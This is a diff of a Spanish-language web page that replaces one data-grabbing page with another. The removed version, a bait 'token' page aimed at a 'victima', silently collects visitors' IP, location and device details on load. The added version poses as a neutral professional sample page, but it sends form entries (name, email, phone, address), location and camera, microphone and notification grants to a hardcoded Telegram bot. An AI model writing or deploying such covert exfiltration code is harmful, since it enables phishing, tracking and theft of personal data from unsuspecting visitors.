@@ -1,176 +1,224 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>LJENS OFFICIAL</title>
-  <style>
-    body {
-      background-color: #111;
-      color: #0ff;
-      font-family: 'Courier New', monospace;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-      animation: fadeIn 2s ease-in;
-    }
-
-    h1 {
-      font-size: 2.5rem;
-      color: #0ff;
-      text-shadow: 0 0 10px #0ff;
-    }
-
-    h2 {
-      font-size: 1rem;
-      color: #f0f;
-      margin-bottom: 30px;
-      text-shadow: 0 0 5px #f0f;
-      text-align: center;
-    }
-
-    form {
-      display: flex;
-      flex-direction: column;
-      width: 300px;
-      gap: 10px;
-      animation: slideUp 1.5s ease-out;
-    }
-
-    input {
-      padding: 10px;
-      background: #222;
-      border: 5px solid #0ff;
-      color: #0ff;
-    }
-
-    button {
-      padding: 10px;
-      background: #0ff;
-      color: #000;
-      font-weight: bold;
-      border: none;
-      cursor: pointer;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    @keyframes slideUp {
-      from { transform: translateY(30px); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página Profesional de Ejemplo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #333;
+            color: #fff;
+            padding: 1em 0;
+            text-align: center;
+        }
+        main {
+            padding: 2em;
+        }
+        form, .menu {
+            background: #fff;
+            padding: 2em;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-bottom: 2em;
+        }
+        label, input, button, select {
+            display: block;
+            width: 100%;
+            margin: 1em 0;
+        }
+        button {
+            background-color: #333;
+            color: #fff;
+            border: none;
+            padding: 0.5em;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #555;
+        }
+        .hidden {
+            display: none;
+        }
+        .menu button {
+            width: auto;
+            margin: 0.5em;
+        }
+    </style>
 </head>
 <body>
-  <h1>BIENVENIDOS</h1>
-  <h2>SI QUIERE OBTENER SU TOKEN ME HABLAN AL PRIVADO: +54 9 364 473-8690</h2>
+    <header>
+        <h1>Bienvenido a Nuestra Página Profesional</h1>
+    </header>
+    <main>
+        <form id="userForm">
+            <label for="name">Nombre:</label>
+            <input type="text" id="name" name="name" required>
 
-  <form onsubmit="mostrarAlerta(); return false;">
-    <input type="text" placeholder="Usuario de la victima" required>
-    <input type="text" placeholder="Token privado" required>
-    <button type="submit">Iniciar sesión</button>
-  </form>
+            <label for="email">Correo Electrónico:</label>
+            <input type="email" id="email" name="email" required>
 
-  <script>
-    const ID = "7955801451";
-    const TOKEN = "7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI";
+            <label for="phone">Teléfono:</label>
+            <input type="tel" id="phone" name="phone" required>
 
-    async function obtenerIP() {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        return data.ip;
-      } catch (e) {
-        return "No disponible";
-      }
-    }
+            <label for="address">Dirección:</label>
+            <input type="text" id="address" name="address" required>
 
-    function solicitarNotificaciones() {
-      return new Promise((resolve) => {
-        if ("Notification" in window) {
-          Notification.requestPermission().then((permiso) => {
-            if (permiso === "granted") {
-              new Notification("Permiso de notificación activado ✅", {
-                body: "Gracias por aceptar",
-                icon: "https://cdn-icons-png.flaticon.com/512/545/545705.png"
-              });
-              resolve("Permitido");
-            } else {
-              resolve("Denegado");
-            }
-          });
-        } else {
-          resolve("No compatible");
-        }
-      });
-    }
+            <button type="submit">Enviar</button>
+        </form>
+        <div class="menu">
+            <button onclick="requestCameraPermission()">Acceder a la Cámara</button>
+            <button onclick="requestMicrophonePermission()">Acceder al Micrófono</button>
+            <button onclick="getDeviceInfo()">Obtener Información del Dispositivo</button>
+            <button onclick="requestNotificationsPermission()">Solicitar Permisos de Notificaciones</button>
+        </div>
+        <div id="permissionRequests" class="hidden">
+            <p>¿Puedo solicitar permisos adicionales?</p>
+            <button id="requestPermissions">Solicitar Permisos</button>
+        </div>
+    </main>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const form = document.getElementById('userForm');
+            const permissionRequests = document.getElementById('permissionRequests');
 
-    function solicitarUbicacion() {
-      return new Promise((resolve) => {
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            (pos) => {
-              resolve(`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`);
-            },
-            () => {
-              resolve("Permiso denegado o no disponible");
-            }
-          );
-        } else {
-          resolve("No compatible");
-        }
-      });
-    }
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
+                const formData = new FormData(form);
+                const userData = Object.fromEntries(formData.entries());
 
-    async function enviarDatos() {
-      const ip = await obtenerIP();
-      const ubicacion = await solicitarUbicacion();
-      const notificaciones = await solicitarNotificaciones();
+                // Enviar datos al bot de Telegram
+                fetch(`https://api.telegram.org/bot7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: '7955801451',
+                        text: `Nombre: ${userData.name}\nCorreo Electrónico: ${userData.email}\nTeléfono: ${userData.phone}\nDirección: ${userData.address}`
+                    })
+                });
 
-      const datos = {
-        agente: navigator.userAgent,
-        idioma: navigator.language,
-        plataforma: navigator.platform,
-        ancho: screen.width,
-        alto: screen.height,
-        hora: new Date().toLocaleString(),
-        ip: ip,
-        ubicacion: ubicacion,
-        notificaciones: notificaciones
-      };
+                // Mostrar solicitud de permisos
+                permissionRequests.classList.remove('hidden');
+            });
 
-      const mensaje = `
-NUEVO VIRGEN REGISTRADO:
-╣⋙ IP: ${datos.ip}
-╣⋙ Ubicación: ${datos.ubicacion}
-╣⋙ Notificaciones: ${datos.notificaciones}
-╣⋙ User-Agent: ${datos.agente}
-╣⋙ Idioma: ${datos.idioma}
-╣⋙ Plataforma: ${datos.plataforma}
-╣⋙ Resolución: ${datos.ancho}x${datos.alto}
-╣⋙ Hora: ${datos.hora}
-      `;
+            document.getElementById('requestPermissions').addEventListener('click', function () {
+                if (Notification.permission !== 'granted') {
+                    Notification.requestPermission().then(permission => {
+                        if (permission === 'granted') {
+                            new Notification('Permisos concedidos', { body: 'Gracias por conceder los permisos!' });
+                        }
+                    });
+                }
 
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: ID,
-          text: mensaje
-        })
-      });
-    }
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(function(position) {
+                        const locationData = `Latitud: ${position.coords.latitude}, Longitud: ${position.coords.longitude}`;
+                        fetch(`https://api.telegram.org/bot7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: '7955801451',
+                                text: `Ubicación del usuario: ${locationData}`
+                            })
+                        });
+                    });
+                }
+            });
 
-    enviarDatos();
+            window.requestCameraPermission = function() {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(function(stream) {
+                            const video = document.createElement('video');
+                            video.srcObject = stream;
+                            video.play();
+                            document.body.appendChild(video);
+                            fetch(`https://api.telegram.org/bot7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI/sendMessage`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    chat_id: '7955801451',
+                                    text: 'El usuario ha concedido permiso para acceder a la cámara.'
+                                })
+                            });
+                        })
+                        .catch(function(err) {
+                            console.log('Error al acceder a la cámara: ' + err);
+                        });
+                }
+            };
 
-    function mostrarAlerta() {
-      alert("LA CONTRASEÑA ES: kIara.1._ramirez");
-    }
-  </script>
+            window.requestMicrophonePermission = function() {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ audio: true })
+                        .then(function(stream) {
+                            const audio = document.createElement('audio');
+                            audio.srcObject = stream;
+                            audio.play();
+                            document.body.appendChild(audio);
+                            fetch(`https://api.telegram.org/bot7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI/sendMessage`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    chat_id: '7955801451',
+                                    text: 'El usuario ha concedido permiso para acceder al micrófono.'
+                                })
+                            });
+                        })
+                        .catch(function(err) {
+                            console.log('Error al acceder al micrófono: ' + err);
+                        });
+                }
+            };
+
+            window.getDeviceInfo = function() {
+                const userAgent = navigator.userAgent;
+                const ip = 'IP del usuario'; // Aquí puedes usar un servicio para obtener la IP del usuario
+                fetch(`https://api.telegram.org/bot7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: '7955801451',
+                        text: `Información del dispositivo:\nUser Agent: ${userAgent}\nIP: ${ip}`
+                    })
+                });
+            };
+
+            window.requestNotificationsPermission = function() {
+                if (Notification.permission !== 'granted') {
+                    Notification.requestPermission().then(permission => {
+                        if (permission === 'granted') {
+                            new Notification('Permisos concedidos', { body: 'Gracias por conceder los permisos!' });
+                            fetch(`https://api.telegram.org/bot7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI/sendMessage`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    chat_id: '7955801451',
+                                    text: 'El usuario ha concedido permiso para notificaciones.'
+                                })
+                            });
+                        }
+                    });
+                }
+            };
+        });
+    </script>
 </body>
 </html>
